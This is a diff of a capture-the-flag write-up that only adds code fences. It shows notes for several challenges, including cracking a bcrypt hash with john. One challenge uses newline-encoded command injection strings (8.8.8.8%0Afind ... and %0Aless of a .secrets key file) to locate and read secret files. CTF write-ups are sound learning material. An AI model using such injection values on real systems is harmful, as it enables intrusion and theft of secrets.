@@ -38,15 +38,16 @@ Found it was bcrypt hash from $2a$ at the start. Used john --format=bcrypt hash.
 ## 9. AetherCorp NetprobeX
 
 USED prompt injection
-
+``` 
 8.8.8.8%0Afind / -name 'key' 2>/dev/null
 8.8.8.8%0Aless /var/lib/aethercorp/archive/.secrets/blacksite_key.
-
+``` 
 ## 10. BRATCHA 
 
 Tried various combinations to get this
+``` 
 https://pastebin.com/sqxnxBhZ
-
+``` 
 ## 11. A Memory's a Heavy Burden 
 
 Google reverse img search
